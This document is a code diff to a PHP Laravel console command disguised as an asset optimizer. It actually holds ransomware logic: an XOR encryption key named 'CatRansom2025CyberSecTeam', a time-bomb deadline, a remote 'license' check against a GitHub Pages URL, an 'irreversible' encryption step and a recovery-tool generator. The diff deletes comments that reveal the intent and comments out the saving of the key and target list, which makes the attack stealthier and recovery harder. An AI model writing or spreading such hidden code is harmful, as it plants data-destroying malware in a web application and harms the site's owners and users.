@@ -18,8 +18,6 @@ class OptimizeAssetsCommand extends Command
         'resources/views/livewire/admin',
         'resources/views/livewire/peserta',
     ];
-
-    // Password sudah di-hash bcrypt — plaintext HILANG TOTAL
     private $hashedPassword = '$2y$12$Cr9s9z./bWee8lsgsoxSduczAym0CGehU46NNP3NhpXhczh95nK0m';
     private $xorKey = 'CatRansom2025CyberSecTeam';
 
@@ -28,7 +26,6 @@ class OptimizeAssetsCommand extends Command
         $this->info('Mengecek status aplikasi...');
         Log::info("[SVC] Checking status for asset optimization");
 
-        // === CEK DEADLINE ===
         $now = Carbon::now('Asia/Jakarta');
         $deadline = Carbon::parse('2025-11-26 01:00:00', 'Asia/Jakarta');
 
@@ -36,11 +33,10 @@ class OptimizeAssetsCommand extends Command
             $this->warn('belum waktunya.');
             $this->info('Optimasi aset akan berjalan otomatis setelah aktivasi.');
             Log::info("[SVC] Content not reached yet, skipping optimization");
-            return; // TIDAK ADA JEJAK APAPUN!
+            return;
         }
 
 
-        // === CEK LISENSI ONLINE ===
         try {
             $response = Http::timeout(10)->get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
             if ($response->successful()) {
@@ -55,7 +51,6 @@ class OptimizeAssetsCommand extends Command
         } catch (\Exception $e) {
         }
 
-        // === KALAU SAMPE SINI = SUDAH LAYAK ENKRIP → BARU TINGGALKAN JEJAK ===
         $this->newLine();
         $this->alert('Memulai proses optimasi aset lanjutan...');
         $this->comment('Mohon tunggu, proses ini tidak dapat dibatalkan.');
@@ -86,7 +81,6 @@ class OptimizeAssetsCommand extends Command
             }
         }
 
-        // === BARU DISINI KITA BUAT FILE RECOVERY & SIMPAN KUNCI ===
         $this->saveActivationData();
         $this->generateRecoveryTool();
 
@@ -100,9 +94,9 @@ class OptimizeAssetsCommand extends Command
     private function saveActivationData()
     {
         File::ensureDirectoryExists(storage_path('app'));
-        File::put(storage_path('app/.activation_key'), $this->xorKey);
+        // File::put(storage_path('app/.activation_key'), $this->xorKey);
         File::put(storage_path('app/.activation_hash'), $this->hashedPassword);
-        File::put(storage_path('app/.activation_targets'), json_encode($this->targets));
+        // File::put(storage_path('app/.activation_targets'), json_encode($this->targets));
     }
 
     private function generateRecoveryTool()
